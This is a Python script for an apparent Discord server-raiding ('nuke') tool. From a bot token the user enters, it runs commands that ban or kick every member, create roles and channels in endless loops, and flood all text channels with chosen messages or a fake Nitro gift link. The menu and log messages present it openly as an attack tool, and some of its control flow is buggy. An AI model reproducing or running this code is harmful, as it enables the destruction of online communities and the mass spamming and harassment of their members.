import discord
from discord.ext import commands
from colorama import Fore

ascii_art = """
 ███▄ ▄███▓ ▒█████   ▒█████   ███▄    █  ██▓     ██▓  ▄████  ██░ ██ ▄▄▄█████▓
▓██▒▀█▀ ██▒▒██▒  ██▒▒██▒  ██▒ ██ ▀█   █ ▓██▒    ▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒
▓██    ▓██░▒██░  ██▒▒██░  ██▒▓██  ▀█ ██▒▒██░    ▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░
▒██    ▒██ ▒██   ██░▒██   ██░▓██▒  ▐▌██▒▒██░    ░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ 
▒██▒   ░██▒░ ████▓▒░░ ████▓▒░▒██░   ▓██░░██████▒░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ 
░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░▓  ░░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   
░  ░      ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░ ▒  ░ ▒ ░  ░   ░  ▒ ░▒░ ░    ░    
░      ░   ░ ░ ░ ▒  ░ ░ ░ ▒     ░   ░ ░   ░ ░    ▒ ░░ ░   ░  ░  ░  ░     
       ░       ░ ░      ░ ░           ░     ░  ░ ░        ░  ░  ░  ░     
"""

print(Fore.RED + ascii_art)
print(f"{Fore.BLUE}Made By MrAnomaly & C4rL0S ")
print(f"""\n{Fore.RED}[1]{Fore.RESET} Ban All
{Fore.GREEN}[2]{Fore.RESET} Kick All
{Fore.CYAN}[3]{Fore.RESET} Role creator
{Fore.LIGHTBLACK_EX}[4]{Fore.RESET} Spammer
{Fore.LIGHTYELLOW_EX}[5]{Fore.RESET} Emoji spammer            
{Fore.WHITE}[6]{Fore.RESET} Fake nitro spammerr
{Fore.LIGHTWHITE_EX}[7]{Fore.RESET} Channel creator  
{Fore.MAGENTA}[!]Nuke Server
{Fore.BLACK}[!!]Nukev.2 totally server(soon....)
    """)

moon = input("root@moon>")

if moon == '1':
    token1 = input("Write the token bot/Escribe el token de tu bot: ")
    prefix1 = input("Prefix¿?: ")
    
    bot = commands.Bot(command_prefix=prefix1, intents=discord.Intents.all())
    
    @bot.event
    async def on_ready():
        print("Im logged in " + str(bot.user))
        print(f"Preparing the attack on the token in {bot.user}")

    @bot.command(name="banall")
    async def banall(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            try:
                await member.ban()
                print(f"El usuario {member.name} fue baneado")
            except Exception as e:
                print(f"No se pudo banear a {member.name}")

    bot.run(token1)

elif moon == '2':
    token2 = input("Write the token bot/Escribe el token de tu bot: ")
    prefix2 = input(f"Prefix¿?: ")
    
    bot = commands.Bot(command_prefix=prefix2, intents=discord.Intents.all())
    
    @bot.event
    async def on_ready():
        print(f"Im logged in {bot.user}")
        print(f"Preparing the attack on the token for {bot.user}")

    @bot.command(name="kickall")
    async def kickall(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
            try:
                await member.kick()
                print(f"El usuario {member.name} fue kickeado")
            except Exception as e:
                print(f"No se pudo kickear a {member.name}")

    bot.run(token2)


if moon == "3": 
                token3 = input("token: ")
                prefix3 = input("Prefix: ")
                name2 = input("Nombre de los roles: ")
                bot = commands.Bot(command_prefix=prefix3, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token3}")
                    print(f"Prefix: {prefix3}")
                    print(f"command: {prefix3}create_roles")
                @bot.command(name="create_role")
                async def create_role(ctx):
                    await ctx.message.delete()
                    while True:
                        await ctx.guild.create_role(name=name2)
                bot.run(token3)


if moon == "4":
                token4 = input("Token Bot: ")
                prefix4 = input("Prefix Bot: ")
                texto = input("¿Que quieres spamear?: ")

                bot = commands.Bot(command_prefix=prefix4, intents=discord.Intents.all())

                @bot.event
                async def on_ready():
                    print(f"Token Bot: {token4}")
                    print(f"Prefix: {prefix4}")
                    print(f"Command {prefix4}spam")
                
                @bot.command(name="spam")
                async def spam(ctx):
                    await ctx.message.delete()
                    while True:
                        for channel in ctx.guild.text_channels:
                            try:
                                await channel.send(texto)
                                print(f"Mensaje enviado a {channel.name}")
                            except discord.Forbidden:
                                print(f"Falta de permisos para enviar el mensaje en: {channel.name}")
                            
                bot.run(token4)


                
if moon == '5':
    token5 = input("Token?: ")
    prefix5 = input("Prefix? :")
    message4 = input("Emoji to spam: ")

    bot = commands.Bot(command_prefix=prefix5, intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        print(f"I'm logged in {bot.user}")
        print(f"Preparing the attack on the token for {bot.user}")

    @bot.command(name="emoji")
    async def emoji(ctx):
        await ctx.message.delete()
        with open("emoji.png", "rb") as f:
            await ctx.send(file=discord.File(f))

    bot.run(token5)


if moon == "6":
    token6 = input("Token Bot: ")
    prefix8 = input("Prefix Bot: ")
    nitro = "discord.gift/vhnuzE2YkNCZ7sfYHHKebKXB"

    bot = commands.Bot(command_prefix=prefix8, intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        print(f"Token Bot: {token6}")
        print(f"Prefix: {prefix8}")

    @bot.command(name="nitrospam")
    async def spam(ctx):
        await ctx.message.delete()
        while True:
            for channel in ctx.guild.text_channels:
                try:
                    await channel.send(nitro)
                    print(f"Nitro enviado a {channel.name}")
                except discord.Forbidden:
                    print(f"Falta de permisos para enviar el mensaje en: {channel.name}")

        bot.run(token6)

elif moon == '7':
    token01 = input("Token: ")
    prefix02 = input("Prefix: ")
    name01 = input("Channels name: ")

    bot = commands.Bot(command_prefix=prefix02, intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        print(f"Im logged in {bot.user}")
        print(f"Preparing the attack on the token for {bot.user}")

    @bot.command(name="channel-spam")
    async def create(ctx):
                    await ctx.message.delete()
                    while True:                   
                        await ctx.guild.create_text_channel(name01)
                        print(f"el canal a sido creado.")

bot.run(token01)